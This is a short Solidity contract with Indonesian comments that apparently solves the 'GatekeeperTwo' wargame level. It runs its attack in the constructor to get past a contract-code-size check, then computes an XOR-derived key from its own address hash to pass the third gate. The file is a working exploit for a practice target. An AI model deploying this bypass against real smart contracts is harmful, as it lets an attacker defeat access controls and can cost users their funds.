// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    
    // Semua logika HARUS ada di constructor agar lolos Gate 2
    constructor(address _targetAddr) {
        IGatekeeperTwo target = IGatekeeperTwo(_targetAddr);

        // --- Perhitungan Gate 3 ---
        
        // 1. Hitung variabel A (Hash dari alamat kontrak INI)
        uint64 A = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        
        // 2. Hitung variabel C (Nilai Max uint64 / semua bit 1)
        uint64 C = type(uint64).max;
        
        // 3. Cari Kunci (B = A XOR C)
        uint64 B = A ^ C;
        
        // Konversi ke bytes8 sesuai parameter fungsi
        bytes8 key = bytes8(B);

        // --- Serangan ---
        // Panggil fungsi enter dengan kunci yang sudah dihitung
        target.enter(key);
    }
}